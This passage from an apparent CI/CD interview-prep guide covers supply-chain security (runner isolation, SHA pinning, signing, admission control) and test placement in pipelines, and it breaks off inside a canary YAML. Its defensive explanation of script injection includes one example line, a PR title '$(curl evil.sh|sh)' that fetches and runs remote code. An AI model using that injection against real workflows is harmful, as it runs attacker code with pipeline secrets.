**The `pull_request_target` footgun** is the textbook enabler. `pull_request_target` runs in the **base repo context with secrets and a writable token**. If such a workflow **checks out and builds the PR's head code**, the fork's attacker-controlled build steps execute *with your secrets in the environment* — instant exfiltration. **Untrusted input** more broadly: PR titles/branch names/labels interpolated unsafely into a `run:` block become **script injection** (`run: echo "${{ github.event.pull_request.title }}"` with a title of `$(curl evil.sh|sh)`).

Defenses:
- **Never execute fork/untrusted code in a secret-bearing context.** Use `pull_request` (no secrets) for building fork PRs; require **manual approval** if secrets are truly needed.
- **Never interpolate untrusted `${{ }}` input into shell** — pass it through an `env:` variable and reference `"$VAR"` instead.
- **Least privilege + branch protection on the pipeline definition** so config changes are reviewed and the token can't reach prod.

Same root cause as the fork-secret leak in the secrets topic: **untrusted code must never share a context with secrets or privilege.**

### Q7. How do you harden and isolate CI runners against supply-chain attacks?

Runners execute untrusted code constantly (dependencies, build scripts, PRs), so a hardened runner limits how far a compromise spreads. This is also what SLSA L3's "isolated builds" is about.

- **Ephemeral, single-use runners.** Each job gets a fresh, throwaway environment destroyed after the run. Nothing persists between jobs — a compromised job can't harvest the next job's secrets, poison a cache, or plant persistence.
- **Least-privilege runner identity.** The runner's own cloud role is minimal, and secrets are injected per-job (or, better, minted via OIDC) rather than sitting on the machine. Scope so a runner compromise reaches almost nothing.
- **Don't reuse a runner across trust levels.** Never run untrusted (fork PR) jobs on the same runner pool that handles trusted builds/prod deploys. Segregate pools; keep prod-credentialed runners off untrusted work.
- **No privileged mode / Docker socket.** Root-equivalent access lets a compromised build escape to the host. Use rootless builders (BuildKit/Kaniko/Buildah) instead of mounting `docker.sock`.
- **Network egress control.** Restrict outbound so a poisoned build can't exfiltrate secrets or phone home to a C2; allowlist the registries/endpoints the build legitimately needs.
- **Self-hosted runner caution.** Self-hosted runners on public repos are a known trap — a fork PR can execute code on *your* infra with *your* network position. If you must, make them ephemeral, sandboxed, isolated, and least-privileged.

The unifying principle: **assume every build might run hostile code, and design so that when it does, it can't persist, can't escape, can't reach prod, and can't call home.**

### Q8. Why pin third-party actions/orbs by commit SHA, and how do you keep pinned deps from going stale?

Because a version **tag is mutable** and a third-party action **runs inside your pipeline with access to its secrets and token.** `@v3` (or even `@v3.1.0`) is a *pointer* the maintainer can move — or an attacker who takes over the maintainer's account can repoint to malicious code, instantly compromising every pipeline that "pinned" to that tag. This is the Codecov/tj-actions class of attack.

**A full commit SHA is immutable** — it references exact, unchangeable code:

```yaml
# BAD: mutable tag, silently repointable
- uses: some/action@v3
# GOOD: immutable commit pin
- uses: some/action@e3cdf8f3c1f2a4b5... # v3.1.0
```

The same logic applies to GitLab CI `include`s (pin to a commit/immutable ref) and CircleCI orbs (pin exact versions from a trusted namespace).

**Keeping pins fresh** (the real objection is "pinning = stale = missed security patches"):
- **Renovate/Dependabot** can pin *to SHA* and open **automated PRs** that bump the SHA (with a comment noting the version), so you stay current via reviewed updates rather than trusting a live tag.
- **Verify + review** those bump PRs — the automation proposes, a human approves, so a poisoned upstream release still hits a review gate.
- **Minimize the surface** — prefer official/first-party actions or a short `run:` you control over a long tail of random marketplace actions.
- **Scope the token** so even a compromised pinned action gets a read-only `GITHUB_TOKEN` and no prod access — defense in depth if a pin is bumped to bad code.

Net: pin for immutability, automate the bumps for freshness, review the bumps for safety.

### Q9. How do SAST, DAST, and secret scanning fit as pipeline gates, and what's the false-positive reality?

These are **shift-left security gates** — automated checks in the pipeline that catch classes of problems before they ship, each looking at a different layer:

- **SAST (static analysis)** — scans **source/bytecode** for vulnerable patterns (SQLi, XSS sinks, unsafe deserialization). Runs early, on the PR, without executing the app (CodeQL, Semgrep).
- **DAST (dynamic analysis)** — tests the **running application** (usually against a staging/preview deploy) for exploitable behavior (auth bypass, injection) from the outside. Later in the pipeline, needs a deployed target.
- **Secret scanning** — detects committed/leaked **credentials** (gitleaks/trufflehog) on the PR and in history.
- **SCA** — complements these by scanning **dependencies** for known CVEs.

```yaml
jobs:
  sast:
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/analyze@v3   # SAST gate on the PR
```

**The false-positive reality** — this is what interviewers probe:
- SAST especially is **noisy**; a wall of low-signal findings trains developers to ignore the gate, which is worse than no gate. **Triage is mandatory** — tune rules, suppress known-false paths (with justification), and track suppressions so they're auditable.
- **False negatives** matter too: a green scan means *"no issues these tools recognize,"* not "secure." Don't let a passing gate create false confidence.
- **Gate policy is a judgment call** — fail the build only on **high-severity, high-confidence** findings; report the rest without blocking, or you grind delivery to a halt and erode trust in the gate.

The mature stance: these gates are **necessary but not sufficient**, their value depends entirely on **signal quality**, and a gate developers route around is a liability. Tune for trust.

### Q10. What is an SBOM, and how is it used — especially in incident response?

An **SBOM (Software Bill of Materials)** is a **machine-readable inventory of every component in an artifact** — every dependency (direct and transitive), its version, and often license and origin — in a standard format (**CycloneDX** or **SPDX**). Think of it as the ingredients label for your software.

You generate it **in the pipeline at build time** (Syft, `cdxgen`, native tooling) so it reflects exactly what shipped, attach it to the artifact, and ideally publish it as a **signed attestation** so its integrity is verifiable.

```yaml
- uses: anchore/sbom-action@v0     # generate CycloneDX/SPDX SBOM at build
  with: { image: ghcr.io/acme/app:${{ github.sha }} }
```

**Its killer use case is incident response.** When the next log4j-class vulnerability drops, the question everyone scrambles to answer is *"are we affected, and where?"* Without SBOMs that's a frantic manual audit across every service. **With** SBOMs it's a query: *"which of our artifacts contain log4j-core in the affected version range?"* — answered in minutes, turning a multi-day fire drill into a targeted patch list. This is why SBOMs are increasingly **mandated** (US executive order, procurement requirements).

Other uses: continuous vulnerability matching (re-scan stored SBOMs as *new* CVEs are disclosed against *already-shipped* artifacts), and license/compliance tracking.

The nuance to state: **an SBOM is an inventory, not a control** — it doesn't *prevent* anything on its own. Its value is **visibility and speed** — knowing your exposure instantly. It's most powerful combined with signing (a *trustworthy* SBOM) and automated vuln matching.

### Q11. What is admission control, and how does it enforce that only signed, scanned artifacts run in production?

**Admission control** is a **deploy-time policy gate in the target environment** that inspects every workload before it's allowed to run and **rejects anything that doesn't meet policy.** It's the enforcement point that makes all the upstream work (signing, provenance, scanning) *mandatory* rather than advisory — the "verify before it runs" gate on the path to prod.

In Kubernetes it's an **admission webhook** — **Kyverno**, **OPA Gatekeeper**, or Sigstore's **policy-controller**; the cloud equivalent is **Binary Authorization** (GCP) / similar. When something tries to deploy, the controller evaluates policy and admits or denies.

What you enforce:
- **Signature verification** — the image must be **cosign-signed by the expected identity** (e.g. your CI workflow's OIDC identity), else denied. An attacker's unsigned/tampered image is refused *even if it reaches the registry.*
- **Provenance verification** — a valid SLSA/in-toto attestation showing it was built from the expected repo/builder.
- **Scan results** — no critical CVEs; came from an approved registry; not running as root, etc.

```yaml
# Kyverno: only run images signed by the expected CI identity
spec:
  rules:
    - name: require-signature
      verifyImages:
        - imageReferences: ["ghcr.io/acme/*"]
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/acme/*"
                    issuer: "https://token.actions.githubusercontent.com"
```

Why it's the linchpin: signing and provenance are **inert unless something checks them.** Admission control is that check, placed at the last possible moment — the cluster boundary — so it catches tampering that happened *anywhere* between build and run (registry compromise, a manual `kubectl` of a rogue image, a supply-chain swap). It converts "we sign our images" into "**only** our signed images can run."

### Q12. What is the two-person rule for production, and where does it apply in a secure supply chain?

The **two-person rule** requires **two distinct, authorized people to approve/execute a sensitive action** — no single individual can unilaterally push to prod. It's the human-side analog of defense-in-depth: it defends against both a **malicious insider** and an **honest mistake** or a **single compromised account.**

Where it applies across the chain:
- **Code merge** — branch protection requiring a review from **someone other than the author** before code reaches main. Baseline separation of duties.
- **Production promotion** — the **environment's required-reviewer** gate demands approval (for high-risk systems, *two* approvers) before the deploy job runs or reads prod secrets.
- **Changes to the pipeline itself** — modifications to workflow definitions, admission policies, and IAM/trust configs are high-leverage (they can disable every other control), so they warrant review too — protect the CI config with the same rigor as prod code.
- **Break-glass / emergency access** — dual authorization even in incidents for the highest access.
- **Signing/release of critical artifacts** — some orgs require dual control to cut a signed release.

Why it matters for supply chain specifically: most of your controls (signing, admission policy, trust conditions) are **configuration**, and configuration is a target — if one person can silently weaken the admission policy or add a malicious build step, the whole chain collapses. The two-person rule ensures **no single actor (or single stolen credential) can subvert the pipeline's integrity** unobserved. The senior framing: pair it with **immutable audit** so every approval is attributable — two people *and* a record.

### Q13. Design a secure build → sign → verify → deploy chain end to end.

I'd build a chain where **every hop is verified and nothing untrusted runs in prod.** Walking it:

**1. Trusted inputs.**
- Source on a protected branch; **required reviews** (two-person), **signed commits** enforced.
- Dependencies via an **internal proxy**, pinned + lockfiled + checksum-verified; **SCA** on every PR.
- Third-party actions **pinned by SHA**; auto-bumped via reviewed Renovate PRs.

**2. Hardened build.**
- **Ephemeral, isolated, least-privilege runners**; no Docker socket; egress-restricted. Untrusted (fork) code never runs with secrets — targeting **SLSA L3**.
- Build the artifact **once**, tagged by git-sha.
- Run **SAST + secret scanning** as gates; scan the built image (Trivy) for critical CVEs.

**3. Sign + attest.**
- **cosign keyless-sign** the image (identity = the CI OIDC workflow).
- Emit **SLSA build provenance** and an **SBOM**, both as **signed attestations** attached to the digest.

**4. Verify at deploy.**
- Push to the registry; deploy via **OIDC short-lived creds** (no stored keys), to a **gated prod environment** (required reviewers, branch filter).
- **Admission control** (Kyverno/Binary Authorization) admits the image **only if** it's signed by the expected identity, has valid provenance, and passed scans — else denied.

**5. Observe + audit.**
- Post-deploy health checks + canary; **immutable audit** (cloud logs via OIDC, GitOps commits) of what shipped and who approved.

```bash
cosign sign ghcr.io/acme/app@$DIGEST                          # 3. sign
cosign verify ghcr.io/acme/app@$DIGEST \                      # 4. verify
  --certificate-identity-regexp '^https://github.com/acme/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

The invariant: **verified in, hardened build, signed out, verified before it runs** — trust is explicit and enforced at every link, and prod refuses anything it can't verify.

### Q14. How do you protect the CI system itself — the pipeline definitions and the platform?

A subtle but critical point: **the CI system is itself production infrastructure, and its configuration is a high-value target** — whoever controls the pipeline definition or the platform's access model controls what ships to prod and can silently disable every other supply-chain control. Secure it like prod.

**Protect the pipeline definition (config-as-code):**
- **Branch protection on the workflow/config files** — changes to `.github/workflows`, `.gitlab-ci.yml`, admission policies, and IAM/trust configs require **review** (two-person). A PR that weakens the pipeline shouldn't merge unnoticed.
- **CODEOWNERS** on pipeline paths so a security/platform owner must approve changes to them.
- Treat admission policies and OIDC trust conditions as **guarded config** — they're the controls; changing them is a privileged action.

**Protect the platform:**
- **RBAC / least privilege** on the CI system — who can edit pipelines, manage secrets, register runners, approve prod. Not everyone needs admin.
- **SSO + MFA** on the CI platform; compromised CI-admin accounts are catastrophic.
- **Immutable audit logs** of configuration changes, secret access, and deploys — outside the actors' ability to edit.
- **Secure the runners** (previous questions) — the execution substrate is part of the platform.
- **Restrict who can register self-hosted runners** and where they attach — a rogue runner can intercept jobs.

Why it's easy to miss: teams pour effort into scanning app code while the *pipeline that builds it* runs on default-broad permissions with anyone able to edit the workflow. The attacker goes for the softer, higher-leverage target. The framing: **the pipeline definition and CI platform are part of your prod attack surface — apply the same review, least-privilege, MFA, and audit you'd apply to prod itself.**

### Q15. "How would you secure the software supply chain?" Give the complete answer.

I'd frame it as **making trust explicit and verifiable at every link — inputs, build, outputs, and deploy — and refusing to run what I can't verify**, then walk the chain:

**1. Secure the inputs.**
- Dependencies through an **internal proxy**, **pinned + lockfiled + checksum-verified**, with **SCA** (Dependabot/Snyk) on every PR and automated patch PRs. Defends dependency confusion, typosquatting, and known CVEs.
- Third-party actions **pinned by commit SHA**, auto-bumped via reviewed PRs.
- **Signed commits** + **required two-person review** on protected branches.

**2. Secure the build.**
- **Ephemeral, isolated, least-privilege runners**; no privileged mode / Docker socket; egress-controlled. **Untrusted code never runs with secrets** (no `pull_request_target` footguns) — defending against PPE and targeting **SLSA L3**.
- **Build once**; run **SAST + secret + image scanning** as tuned, high-signal gates.

**3. Secure the outputs.**
- **Sign artifacts** (cosign keyless via OIDC), emit **SLSA provenance** and an **SBOM** as **signed attestations**. Now every artifact is authentic, traceable, and inventoried.

**4. Secure the deployment.**
- Deploy via **OIDC short-lived creds** (no long-lived keys) to a **gated environment**.
- **Admission control** (Kyverno / Binary Authorization) runs **only** images that are signed by the expected identity, have valid provenance, and passed scans.

**5. Secure the system + operate it.**
- **Protect the CI platform and pipeline definitions** (RBAC, MFA, branch protection on config, immutable audit).
- **SBOMs for incident response**, continuous re-scanning of shipped artifacts against new CVEs, and a tested rotation/patch runbook.

The one-sentence close: **defense-in-depth across the whole chain — verified inputs, a hardened isolated build, signed and attested outputs, and enforced verification before anything runs in prod — because a supply chain is only as trustworthy as its weakest unverified link.**
## Testing & Verification in the Pipeline

### Summary

**What this topic covers**

Verification is the part of CI/CD that earns the "confidence" in "continuous delivery" — the tests, checks, and gates that decide whether a change is allowed to move forward. This topic covers *where* each kind of test belongs in the pipeline (fast unit tests on every push, integration after build, e2e later and slower), the **test pyramid vs test trophy** debate applied to CI, **contract testing** for service boundaries, **smoke tests** and **synthetic/health checks** run *after* deploy, **ephemeral test environments** (docker-compose, Testcontainers, per-PR namespaces), **test data management**, **shift-left**, gating vs non-gating checks, **flaky-test handling**, parallelization and sharding, testing IaC, performance/load and accessibility/visual-regression tests, verifying a canary with metrics, and the underlying cost/speed/confidence tradeoff. The 15 questions here answer one interview question in many disguises: *how do you know a deploy is safe?* Verification sits between the build (which produces an immutable artifact) and the deploy strategy (which decides how that artifact reaches users) — it's the evidence that lets the pipeline proceed without a human eyeballing every change.

**Mental model**

Think of the pipeline as a series of increasingly expensive, increasingly realistic filters, and put each check at the earliest stage where it can possibly run. A static-analysis or unit failure should cost seconds and block the push; an e2e failure costs minutes and blocks the deploy; a smoke-test failure costs a rollout and triggers rollback. The guiding principle is **fast feedback for the common case, high fidelity for the risky case**. Cheap checks run on every commit and gate the merge; expensive checks run less often (post-merge, nightly, or pre-prod) and gate the deploy. Crucially, verification does not stop at deploy: **post-deploy verification** (smoke tests, synthetic probes, canary metric analysis) is what actually proves the running system works against real infrastructure, because a green pre-merge suite only proves the code was correct in a test harness, not that *this deploy* is healthy in production.

**Key terms**

- **Test pyramid** — many fast unit tests, fewer integration, fewest e2e; the classic shape optimizing for speed.
- **Test trophy** — Kent C. Dodds' shape favoring integration tests as the sweet spot of confidence vs cost, with static analysis as the base.
- **Contract test** — verifies a consumer and provider agree on an API shape (Pact) without a full end-to-end environment.
- **Smoke test** — a handful of critical-path checks run immediately post-deploy to confirm the deployment is alive; the deploy gate.
- **Synthetic monitoring** — scripted probes that continuously exercise real user journeys against production.
- **Ephemeral environment** — a throwaway environment (per-PR namespace, docker-compose, Testcontainers) spun up for a test run and torn down after.
- **Testcontainers** — a library that boots real dependencies (Postgres, Kafka) in Docker inside the test process for realistic integration tests.
- **Shift-left** — running security/quality/tests as early as possible so defects are caught cheaply.
- **Gating check** — a check whose failure blocks the merge or deploy (required); a **non-gating** check only warns.
- **Flaky test** — a test that passes and fails non-deterministically on the same code, eroding trust in the suite.
- **Sharding** — splitting a test suite across parallel runners to cut wall-clock time.
- **Canary analysis** — automated comparison of a canary's metrics against a baseline to decide promote-or-abort.

**Why interviewers ask this**

Anyone can say "we run tests in CI." The signal is in *placement and tradeoffs*: does the candidate know why unit tests gate the push but load tests don't gate the merge? Do they understand that a green build is not the same as a healthy deploy, and that smoke tests after rollout are a distinct, essential layer? Senior candidates talk about the cost/speed/confidence triangle, about flaky tests as a trust problem (not just a nuisance), about ephemeral environments and contract testing as ways to get integration confidence without a brittle full-e2e swamp, and about which checks are gating vs advisory. Junior candidates list test types; seniors design a *verification strategy* — including what runs after deploy — and can defend why each gate exists. Platform/DevOps interviewers especially probe post-deploy verification and canary analysis, because that's where reliability engineering meets delivery.

**Common confusions**

- "All tests should gate the merge" — no; slow/flaky/expensive tests (full e2e, load) often run post-merge or nightly to keep the merge path fast.
- "A passing CI build means the deploy is safe" — it means the code passed in a harness; smoke/synthetic checks against the live deploy prove *this deployment* is healthy.
- "Contract tests replace e2e" — they replace *most* cross-service e2e for API compatibility, but not full user-journey coverage.
- "More e2e = more confidence" — beyond a point e2e adds flakiness and slowness faster than confidence; the trophy pushes work down to integration.
- "Flaky tests are harmless if you just re-run" — blind retries hide real bugs and destroy trust; quarantine and fix instead.
- "Test data can be shared across tests" — shared mutable state is the #1 source of flakiness; isolate per test.

**What follows from this topic**

Verification feeds directly into deploy strategy: canary and blue-green are only safe if you have smoke tests and metric-based canary analysis to gate them (see **Deploy Observability, Rollback & DORA**). The cost/speed tradeoffs here connect to pipeline-optimization questions in **Scenario & Best-Practice Playbooks** ("speed up a 45-minute pipeline" is largely a test-parallelization and affected-build problem). Ephemeral environments and Testcontainers tie back to artifact/image topics, and gating-vs-advisory checks tie to branch-protection and merge-queue practices.

### Q1. Where should each type of test run in a CI/CD pipeline, and why?

Place each test at the earliest stage where it can meaningfully run, trading realism against speed:

| Test type | Stage | Gates | Typical time |
|---|---|---|---|
| Static analysis / lint / type-check | pre-commit + on push | merge | seconds |
| Unit tests | on every push | merge | seconds–1 min |
| Contract tests | on push (consumer) / provider verify | merge | seconds |
| Integration tests | after build, against ephemeral deps | merge | 1–5 min |
| E2E / UI tests | post-merge or pre-prod | deploy | 5–20 min |
| Smoke tests | immediately post-deploy | traffic shift / rollback | seconds |
| Load / performance | nightly or pre-prod, rarely per-PR | usually advisory | minutes |

The principle: **gate the merge on the fast layers** (lint, unit, contract, quick integration) so developers get feedback in a couple of minutes and main stays green; run **slow/expensive layers later** (e2e post-merge, load nightly) where their cost doesn't tax every push; and run **smoke/synthetic checks after deploy** because they're the only ones that prove the live system works.

```yaml
# GitHub Actions — fast checks gate the PR, e2e runs after merge
name: ci
on:
  pull_request:
  push:
    branches: [main]
jobs:
  fast:                      # gates every PR
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run lint && npm run typecheck
      - run: npm run test:unit
      - run: npm run test:contract
  e2e:                       # only on main, after merge
    if: github.ref == 'refs/heads/main'
    needs: fast
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run test:e2e
```

### Q2. Test pyramid vs test trophy — which do you apply to CI, and does it matter?

The **test pyramid** (many unit, fewer integration, fewest e2e) optimizes for speed and determinism — cheap tests at the bottom. The **test trophy** (Kent C. Dodds) keeps static analysis as a wide base but pushes the bulk of investment into **integration tests**, arguing they hit the best confidence-per-second because they test behavior across units the way users actually exercise it, while modern tooling (Testcontainers, in-process servers) made integration tests fast enough to run in bulk.

For CI I lean trophy-ish in practice: heavy static analysis and type-checking (free, instant), a solid unit layer for pure logic, a *large* integration layer against real-ish dependencies, and a thin, ruthlessly curated e2e layer for critical user journeys only. The reason is operational: e2e tests are where flakiness and slowness concentrate, so I want the *minimum* e2e that gives confidence in the happy paths, and everything else pushed down. The shape you draw matters less than the rule behind both: **put confidence where it's cheap and reliable, not where it's brittle.**

### Q3. What is contract testing and when would you reach for it instead of end-to-end tests?

Contract testing verifies that two services agree on the shape of their interaction *without standing up both services together*. The **consumer** records its expectations of a provider's API (request → expected response) as a **contract** (e.g. a Pact file); the **provider** independently replays those expectations against itself in *its own* CI to prove it still satisfies them. This is **consumer-driven contract testing**.

Reach for it when you have multiple services and want to catch breaking API changes *before* they reach a shared environment. Full e2e across services is slow, flaky, and requires every service deployed and healthy simultaneously — a coordination nightmare. Contract tests give you the specific guarantee you actually care about ("does the provider still return the fields the consumer needs?") in each service's own fast pipeline, decoupled from the other team's deploy schedule. Publish contracts to a broker (Pactflow) so a provider knows *which* consumer versions it must not break, and can gate its own deploy on `can-i-deploy`. Contract tests don't replace e2e for full user journeys — they replace the vast majority of cross-service integration e2e that only existed to catch schema drift.

### Q4. What are smoke tests and where do they belong in the pipeline?

Smoke tests are a small set — literally a handful — of checks against the **most critical paths**, run **immediately after a deploy** to confirm the deployment is alive and wired up correctly before (or while) you shift real traffic to it. "Can we reach the homepage, authenticate, and complete one core transaction?" — not exhaustive coverage, just "is this thing on fire?"

They belong *post-deploy, pre-traffic-shift*, acting as **the deploy gate**: deploy the new version to a target (a blue environment, a canary pod), run smoke tests against it, and only proceed to route users if they pass; otherwise abort/rollback automatically. This is distinct from the pre-merge suite, which validated the *code*; smoke tests validate *this specific deployment against real infrastructure* — config, secrets, DNS, database connectivity, downstream reachability — none of which a unit test can catch.

```bash
# post-deploy smoke test against the freshly deployed target
set -euo pipefail
BASE="https://green.acme.internal"
curl -fsS "$BASE/healthz" >/dev/null                       # process is up
curl -fsS "$BASE/api/status" | grep -q '"db":"ok"'          # DB reachable
token=$(curl -fsS -XPOST "$BASE/login" -d @creds.json | jq -r .token)
curl -fsS -H "Authorization: Bearer $token" "$BASE/api/orders/self" >/dev/null
echo "smoke OK — safe to shift traffic"
```

### Q5. What's the difference between pre-deploy and post-deploy verification?

**Pre-deploy verification** happens before the artifact reaches production: lint, unit, integration, contract, e2e against a staging/ephemeral environment. It answers *"is this change correct?"* and gates whether you deploy at all. It runs against test infrastructure, so it can't see production config, real data volumes, or live downstream behavior.

**Post-deploy verification** happens after the artifact is running in (or partially in) production: smoke tests, synthetic probes, health/readiness checks, and canary metric analysis. It answers *"is this deployment healthy right now?"* and gates whether you shift traffic / continue the rollout / trigger rollback.

You need both because they catch different failure classes. Pre-deploy catches logic bugs cheaply; post-deploy catches deployment-specific failures — a bad secret, a missing migration, a config typo, an incompatibility that only shows under real load — that no pre-deploy test can. A mature pipeline treats post-deploy verification as a first-class gate wired to automated rollback, not as "we'll notice if the pager goes off."

### Q6. How do you set up realistic dependencies for integration tests in CI?

Three tiers, in order of realism:

1. **Testcontainers** — spin up real dependency images (Postgres, Redis, Kafka, LocalStack for AWS) *inside the test process*; the library manages lifecycle and gives you the mapped ports. This is my default: real engines, isolated per run, no shared-environment contention.
2. **docker-compose services** — declare dependencies as service containers the CI job starts before tests. Simple and language-agnostic.
3. **Per-PR ephemeral namespaces** — for full integration/e2e, deploy the whole app + deps into a throwaway Kubernetes namespace (or a preview environment) keyed to the PR, run tests, tear it down.

```yaml
# GitHub Actions service container — real Postgres for integration tests
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        ports: ["5432:5432"]
        options: >-
          --health-cmd="pg_isready" --health-interval=5s --health-retries=5
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run migrate && npm run test:integration
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/app
```

Avoid mocking the database or message broker for integration tests — mocks encode *your* assumptions about the dependency, and the bugs you care about live in the gap between those assumptions and reality.

### Q7. How do you manage test data in CI so tests stay isolated and reliable?

The overriding rule: **no shared mutable state**. The most common source of flaky, order-dependent test suites is tests reading and writing the same rows.

- **Seed deterministically** — each integration test run gets a fresh database (Testcontainers) or a migrated-then-seeded schema; never rely on data left by a previous run.
- **Factories over fixtures** — generate the specific objects a test needs via factory functions (`makeUser({ plan: 'pro' })`) rather than a giant shared fixture file everyone silently depends on.
- **Isolate per test** — wrap each test in a transaction that rolls back, or use a unique namespace/tenant/prefix per test so parallel tests don't collide.
- **Prod-like but anonymized** — for realistic volume/shape, use anonymized/synthetic copies of production data; never real PII in CI (privacy + security). Mask, tokenize, or generate.
- **Deterministic clocks/IDs** — freeze time and seed random generators so tests don't fail at midnight or on a rare UUID collision.

If you find yourself adding `sleep` or ordering tests to make them pass, that's a data-isolation smell, not a timing problem.

### Q8. What does "shift-left" mean and how do you implement it in a pipeline?

Shift-left means moving verification — tests, security scanning, quality checks, even policy — **as early as possible** in the delivery flow, ideally to the developer's machine and the PR, rather than discovering problems in staging or prod where they're far more expensive to fix.

Concretely: run linters and unit tests in a **pre-commit hook**; run SAST, dependency/secret scanning, unit, and contract tests **on the PR** so a reviewer never approves code with a known vulnerability or failing test; do IaC validation and policy checks (OPA/Conftest) on the PR that changes the Terraform. The economic argument is a defect-cost curve: a bug caught by a type-checker costs seconds; the same bug caught in production costs an incident.

Shift-left doesn't mean *only* left — you still need post-deploy verification (you can't shift a real-traffic canary onto a laptop). It means: for every class of problem, ask "what's the earliest, cheapest place I could catch this?" and put the check there.

### Q9. Which checks should gate a merge or deploy, and which should just warn?

Gate on checks that are **fast, deterministic, and high-signal**; make **slow, noisy, or advisory** checks non-blocking.

**Gating (block merge/deploy):**
- Compile / type-check / lint
- Unit + fast integration tests
- Contract tests
- Secret scanning, high/critical SAST and dependency vulnerabilities
- Smoke tests post-deploy (gate the traffic shift)

**Non-gating (warn / inform):**
- Code coverage *deltas* (report, don't hard-fail on a 0.1% dip — it invites gaming)
- Performance benchmarks with normal variance (track trend, alert on regression, rarely hard-block)
- Low-severity lint suggestions, style nits an autoformatter could fix
- Visual-regression diffs pending human review

The test for "should this gate?" is: *if this check fails, is the right action always to stop?* If yes, gate it. If the answer is "it depends / usually just look into it," make it advisory — because a gate that people routinely override or ignore trains the team to ignore *all* gates, including the ones that matter.

### Q10. How do you handle flaky tests in the verification pipeline?

Flaky tests are a **trust problem**: once a suite fails randomly, people start re-running until green and stop reading failures — at which point the suite protects nothing. Handle them deliberately:

1. **Detect** — track pass/fail history per test; a test that fails and passes on the same commit is flaky. CI platforms and tools (e.g. test-retry reporters) surface flake rates.
2. **Quarantine** — immediately move a known-flaky test out of the gating set (tag it, run it non-blocking) so it stops failing unrelated PRs. This buys time without deleting coverage.
3. **Fix at the root** — flakiness is almost always shared state, timing/`sleep`-based waits, real network calls, or nondeterministic ordering. Fix the cause (proper waits, isolation, seeded randomness), don't paper over it.
4. **Bounded retries, carefully** — a single automatic retry can absorb genuinely rare infra blips, but retries as a *policy* hide real intermittent bugs; use sparingly and alert when a retry saves a run.
5. **Trust budget** — treat flake rate as a tracked metric with a target; a rising flake rate is a reliability regression, not background noise.

The anti-pattern to name: a suite everyone re-runs three times to merge. That suite has a 0% effective gating value.

### Q11. How do you parallelize and shard end-to-end tests to keep the pipeline fast?

E2E wall-clock time is usually the pipeline bottleneck, and it's embarrassingly parallel. Two levers:

- **Sharding** — split the test set across N runners. Static split (`--shard=1/4`) is simplest; smarter tools split by historical timing so shards finish together instead of one runner carrying the slow tests.
- **Parallelism within a runner** — many e2e frameworks (Playwright, Cypress) run multiple workers per machine.

```yaml
# GitHub Actions matrix — 4-way e2e shard
jobs:
  e2e:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npx playwright test --shard=${{ matrix.shard }}/4
```

Prerequisites that make sharding actually work: tests must be **independent** (no ordering, no shared data) and each shard needs its own **isolated environment/data** so shards don't stomp each other. If tests share a database, parallelism *causes* flakiness instead of curing slowness — fix isolation first (see Q7). Combine sharding with running e2e only on affected paths and only post-merge to keep the PR loop tight.

### Q12. How do you test infrastructure and IaC changes in CI?

Infrastructure-as-code deserves the same verification discipline as application code:

- **Format + validate** — `terraform fmt -check`, `terraform validate` catch syntax/config errors instantly.
- **Static policy / security** — `tflint`, `tfsec`/`checkov`, or OPA/Conftest enforce guardrails (no public S3 buckets, mandatory tags, no `0.0.0.0/0` SSH) on the PR.
- **Plan as a gate** — run `terraform plan` on the PR and post the diff as a comment so a reviewer sees exactly what will change *before* apply; this is the single most valuable IaC check.
- **Integration testing** — Terratest (Go) or `kitchen-terraform` actually `apply` into a throwaway account/project, assert the created resources behave (endpoint reachable, permissions correct), then `destroy`. Reserve this for modules/critical infra — it's slow and costs real cloud resources.

```yaml
jobs:
  terraform:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: terraform fmt -check
      - run: terraform init -backend=false
      - run: terraform validate
      - run: checkov -d .
      - run: terraform plan -no-color -out=plan.tfplan   # posted to PR as comment
```

Apply itself runs from the pipeline (never a laptop) with short-lived OIDC credentials, gated by the plan review and, for prod, a manual approval.

### Q13. Should performance and load tests run in CI, and should they gate?

Yes, but rarely on the per-PR merge path and rarely as a hard gate. Load tests (k6, Gatling, Locust) are slow, need a production-like environment, and have inherent variance — hard-failing a merge on a 3% p95 fluctuation trains people to bypass the gate.

Practical placement:

- **Micro-benchmarks** for hot code paths can run per-PR and *warn* on regression beyond a threshold, tracking the trend.
- **Full load tests** run nightly or pre-prod against a staging environment sized like production, and **gate the deploy** only against explicit SLOs ("p95 < 200ms at 1k rps, error rate < 0.1%") when the workload is latency-critical.

```javascript
// k6 smoke-level perf check with a pass/fail threshold
import http from 'k6/http';
export const options = {
  vus: 50, duration: '2m',
  thresholds: {
    http_req_duration: ['p(95)<200'],   // fail the run if p95 exceeds 200ms
    http_req_failed:   ['rate<0.001'],
  },
};
export default () => { http.get('https://staging.acme.internal/api/search?q=test'); };
```

The decision rule: gate on load tests when a latency/throughput regression is a *release-blocking* defect for your product (payments, checkout, search); otherwise treat them as trend monitoring that pages a human.

### Q14. How does verification differ for a canary deploy, and what makes a canary "pass"?

A canary shifts a small percentage of real traffic to the new version and *verifies with production metrics* rather than scripted tests. The canary "passes" when its **key metrics are statistically indistinguishable from (or better than) the baseline** over an observation window — typically error rate, latency (p95/p99), and saturation (CPU/memory), compared against the stable version serving the rest of the traffic *at the same time* (so you control for time-of-day and traffic mix).

Automated canary analysis (Argo Rollouts with a metrics provider, Flagger, or Kayenta) queries Prometheus/Datadog on an interval: if the canary's error rate or latency crosses a threshold relative to baseline, it **aborts and rolls back automatically**; if it stays healthy across successive steps (5% → 25% → 50% → 100%), it promotes.

```yaml
# Argo Rollouts AnalysisTemplate — gate canary promotion on error rate
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata: { name: error-rate }
spec:
  metrics:
    - name: error-rate
      interval: 1m
